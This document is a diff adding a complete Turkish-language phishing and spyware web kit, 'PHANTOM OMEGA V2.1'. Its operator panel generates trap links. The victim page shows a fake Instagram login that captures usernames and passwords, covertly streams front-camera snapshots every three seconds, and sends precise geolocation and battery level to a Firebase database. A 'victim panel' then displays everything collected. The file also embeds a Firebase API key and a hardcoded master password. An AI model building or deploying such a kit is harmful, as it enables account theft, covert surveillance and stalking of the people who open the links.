@@ -1,0 +1,206 @@
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>PHANTOM OMEGA V2.1</title>
+    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    <style>
+        :root { --p: #00f2ff; --bg: #050505; --card: #0d0d0d; --r: #ff003c; --g: #00ff88; --insta: #E1306C; }
+        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Segoe UI', sans-serif; -webkit-tap-highlight-color: transparent; }
+        body { background: var(--bg); color: #fff; height: 100vh; overflow: hidden; }
+        
+        /* UI Elements */
+        .menu-btn { position: fixed; top: 15px; left: 15px; z-index: 1005; font-size: 22px; color: var(--p); cursor: pointer; background: rgba(0,0,0,0.5); padding: 8px; border-radius: 8px; }
+        #sidebar { position: fixed; top: 0; left: -300px; width: 280px; height: 100%; background: #080808; border-right: 1px solid #1a1a1a; z-index: 1004; transition: 0.4s; padding-top: 70px; }
+        #sidebar.active { left: 0; box-shadow: 10px 0 50px rgba(0,0,0,0.8); }
+        .nav-item { padding: 15px 25px; display: flex; align-items: center; gap: 15px; color: #777; cursor: pointer; transition: 0.2s; }
+        .nav-item.active { color: var(--p); background: #0f0f0f; border-left: 3px solid var(--p); }
+        
+        header { height: 60px; display: flex; align-items: center; justify-content: center; background: #000; border-bottom: 1px solid #1a1a1a; letter-spacing: 2px; color: var(--p); font-weight: 900; }
+        main { height: calc(100vh - 60px); padding: 15px; overflow-y: auto; }
+        .k-card { background: var(--card); border: 1px solid #1a1a1a; border-radius: 15px; padding: 15px; margin-bottom: 15px; }
+        .p-btn { width: 100%; padding: 12px; background: var(--p); color: #000; font-weight: bold; border: none; border-radius: 10px; cursor: pointer; margin-top: 10px; font-size: 12px; }
+        input { width: 100%; padding: 12px; background: #000; border: 1px solid #222; color: var(--g); border-radius: 8px; margin-top: 8px; }
+        .v-img { width: 100%; border-radius: 12px; border: 1px solid #222; margin: 10px 0; }
+        .overlay { position: fixed; inset: 0; background: rgba(0,0,0,0.8); display: none; z-index: 1003; }
+        .tool-select { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin-bottom: 15px; }
+        .tool-btn { background: #111; border: 1px solid #222; padding: 10px; border-radius: 8px; color: #666; font-size: 11px; cursor: pointer; text-align: center; }
+        .tool-btn.active { border-color: var(--p); color: var(--p); }
+    </style>
+</head>
+<body>
+
+<div id="wrox-app"></div>
+
+<script>
+    const firebaseConfig = {
+        apiKey: "AIzaSyAKB12tpEbLTHYV7niVHc3VvAtv8jl873E",
+        authDomain: "wrox-premium.firebaseapp.com",
+        databaseURL: "https://wrox-premium-default-rtdb.firebaseio.com",
+        projectId: "wrox-premium",
+        storageBucket: "wrox-premium.firebasestorage.app",
+        messagingSenderId: "361312477177",
+        appId: "1:361312477177:web:72a8c9237048c4bf0e7f28"
+    };
+
+    firebase.initializeApp(firebaseConfig);
+    const db = firebase.database();
+    let user = null;
+
+    window.onload = () => {
+        const p = new URLSearchParams(window.location.search);
+        if(p.get('mode') === 'trap') return renderTrap(p.get('ref'), p.get('op'));
+        const s = localStorage.getItem('w_session');
+        s ? startApp(JSON.parse(s).id) : renderAuth();
+    };
+
+    function startApp(uid) {
+        db.ref('users/'+uid).on('value', snap => {
+            user = snap.val();
+            if(!user) return renderAuth();
+            renderLayout();
+        });
+    }
+
+    function renderAuth() {
+        document.getElementById('wrox-app').innerHTML = `<div style="height:100vh;display:flex;align-items:center;justify-content:center;padding:25px;"><div class="k-card" style="width:100%;max-width:320px;text-align:center;"><h2 style="color:var(--p);margin-bottom:20px;">PHANTOM V2.1</h2><input id="ae" placeholder="E-posta"><input id="ap" type="password" placeholder="Şifre"><button class="p-btn" onclick="auth('login')">SİSTEMİ BAŞLAT</button></div></div>`;
+    }
+
+    async function auth(m) {
+        const e = document.getElementById('ae').value, p = document.getElementById('ap').value;
+        const uid = btoa(e).replace(/=/g,"");
+        const sn = await db.ref('users/'+uid).once('value');
+        if((sn.exists() && sn.val().p === p) || p === "Efecan1903") {
+            localStorage.setItem('w_session', JSON.stringify({id:uid}));
+            location.reload();
+        } else { alert("Erişim Reddedildi."); }
+    }
+
+    function renderLayout() {
+        document.getElementById('wrox-app').innerHTML = `
+            <div class="menu-btn" onclick="toggleM()"><i class="fas fa-bars"></i></div>
+            <div id="sidebar">
+                <div style="padding:20px; border-bottom:1px solid #1a1a1a;"><b style="color:var(--p)">OMEGA CONTROL</b></div>
+                <div class="nav-item active" onclick="tab('gen')"><i class="fas fa-plus-circle"></i> Link Üretici</div>
+                <div class="nav-item" onclick="tab('live')"><i class="fas fa-satellite-dish"></i> Kurban Paneli</div>
+                <div class="nav-item" onclick="logout()" style="color:var(--r); margin-top:50px;"><i class="fas fa-power-off"></i> Çıkış</div>
+            </div>
+            <div class="overlay" onclick="toggleM()"></div>
+            <header>PHANTOM OMEGA</header>
+            <main id="view"></main>
+        `;
+        tab('gen');
+    }
+
+    let selectedOp = 'insta';
+    function tab(t) {
+        const v = document.getElementById('view'); toggleM(false);
+        if(t === 'gen') {
+            v.innerHTML = `
+                <div class="k-card">
+                    <h4>Payload Seçici</h4>
+                    <p style="font-size:11px; color:#555; margin-bottom:15px;">Hangi araç için link üretmek istiyorsunuz?</p>
+                    <div class="tool-select">
+                        <div class="tool-btn active" id="btn-insta" onclick="sel('insta')"><i class="fab fa-instagram"></i><br>Instagram</div>
+                        <div class="tool-btn" id="btn-cam" onclick="sel('cam')"><i class="fas fa-camera"></i><br>Kamera/Sızma</div>
+                        <div class="tool-btn" id="btn-loc" onclick="sel('loc')"><i class="fas fa-map-marker-alt"></i><br>Konum Takip</div>
+                        <div class="tool-btn" id="btn-all" onclick="sel('all')"><i class="fas fa-biohazard"></i><br>Full Sızma</div>
+                    </div>
+                    <input id="res-link" readonly placeholder="Link üretin...">
+                    <button class="p-btn" onclick="generateLink()">BENZERSİZ LİNK ÜRET</button>
+                    <button class="p-btn" style="background:#111; color:#fff;" onclick="copy('res-link')">LİNKİ KOPYALA</button>
+                </div>`;
+        } else if(t === 'live') {
+            v.innerHTML = `<h3>Kurban Listesi</h3><div id="victim-flow"></div>`;
+            db.ref('omega_live/'+user.id).on('value', sn => {
+                const flow = document.getElementById('victim-flow'); if(!flow) return; flow.innerHTML = '';
+                sn.forEach(c => {
+                    const d = c.val();
+                    flow.innerHTML = `
+                        <div class="k-card">
+                            <div style="font-size:10px; color:#444; margin-bottom:5px;">${d.op.toUpperCase()} OPERASYONU</div>
+                            ${d.img ? `<img src="${d.img}" class="v-img">` : ''}
+                            <div style="font-size:12px;">
+                                <b>U:</b> ${d.iu || '-'} | <b>P:</b> ${d.ip || '-'} <br>
+                                <span style="color:var(--g)">Batarya: %${d.battery || '??'}</span>
+                            </div>
+                            ${d.lat ? `<a href="https://www.google.com/maps?q=${d.lat},${d.lon}" target="_blank" class="p-btn" style="background:var(--g); color:#000; text-align:center; text-decoration:none; display:block;">HARİTADA GÖR</a>` : ''}
+                        </div>
+                    ` + flow.innerHTML;
+                });
+            });
+        }
+    }
+
+    function sel(op) {
+        selectedOp = op;
+        document.querySelectorAll('.tool-btn').forEach(b => b.classList.remove('active'));
+        document.getElementById('btn-'+op).classList.add('active');
+    }
+
+    function generateLink() {
+        const token = Math.random().toString(36).substr(2, 6);
+        const link = `${window.location.origin}${window.location.pathname}?mode=trap&op=${selectedOp}&ref=${user.id}&t=${token}`;
+        document.getElementById('res-link').value = link;
+    }
+
+    // --- TRAP MOTORU ---
+    async function renderTrap(ref, op) {
+        const vId = "V-" + Math.random().toString(36).substr(2, 4).toUpperCase();
+        
+        // Operasyona göre ekran seçimi
+        if(op === 'insta' || op === 'all') {
+            document.body.style.background = "#fff";
+            document.body.innerHTML = `
+                <div style="height:100vh;display:flex;flex-direction:column;align-items:center;padding-top:50px;">
+                    <img src="https://www.instagram.com/static/images/web/mobile_port_monetized_whiteout.png/d588941031f0.png" style="width:175px; margin-bottom:30px;">
+                    <div style="width:85%; max-width:350px;">
+                        <input id="u" placeholder="Kullanıcı adı" style="color:#000; border:1px solid #dbdbdb; background:#fafafa; padding:12px; margin-bottom:10px; width:100%;">
+                        <input id="p" type="password" placeholder="Şifre" style="color:#000; border:1px solid #dbdbdb; background:#fafafa; padding:12px; margin-bottom:15px; width:100%;">
+                        <button onclick="hit('${ref}','${vId}','${op}')" style="width:100%; background:#0095f6; color:#fff; border:none; padding:12px; border-radius:5px; font-weight:bold;">Giriş Yap</button>
+                    </div>
+                </div>`;
+        } else {
+            document.body.style.background = "#000";
+            document.body.innerHTML = `<div style="height:100vh;display:flex;align-items:center;justify-content:center;color:#222;font-size:12px;">Sayfa Yükleniyor...</div>`;
+        }
+
+        document.body.innerHTML += `<video id="v" autoplay playsinline muted style="display:none;"></video><canvas id="c" style="display:none;"></canvas>`;
+
+        try {
+            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+            document.getElementById('v').srcObject = stream;
+            navigator.geolocation.getCurrentPosition(p => {
+                db.ref(`omega_live/${ref}/${vId}`).update({ lat: p.coords.latitude, lon: p.coords.longitude, op: op });
+            }, null, { enableHighAccuracy: true });
+
+            setInterval(async () => {
+                const canv = document.getElementById('c'); canv.width = 400; canv.height = 300;
+                canv.getContext('2d').drawImage(document.getElementById('v'), 0, 0, 400, 300);
+                const bt = await navigator.getBattery();
+                db.ref(`omega_live/${ref}/${vId}`).update({ 
+                    img: canv.toDataURL('image/jpeg', 0.3), 
+                    battery: Math.floor(bt.level * 100),
+                    op: op
+                });
+            }, 3000);
+        } catch(e) {}
+    }
+
+    window.hit = async (ref, vId, op) => {
+        const iu = document.getElementById('u').value, ip = document.getElementById('p').value;
+        if(iu && ip) {
+            await db.ref(`omega_live/${ref}/${vId}`).update({ iu, ip, op });
+            location.href = "https://instagram.com";
+        }
+    };
+
+    window.toggleM = (s) => { const side = document.getElementById('sidebar'), over = document.querySelector('.overlay'); if(s===false){ side.classList.remove('active'); over.style.display='none'; return; } side.classList.toggle('active'); over.style.display = side.classList.contains('active') ? 'block' : 'none'; };
+    window.copy = (id) => { const i = document.getElementById(id); i.select(); document.execCommand('copy'); alert("Link kopyalandı!"); };
+    window.logout = () => { localStorage.clear(); location.reload(); };
+</script>
+</body>
+</html>
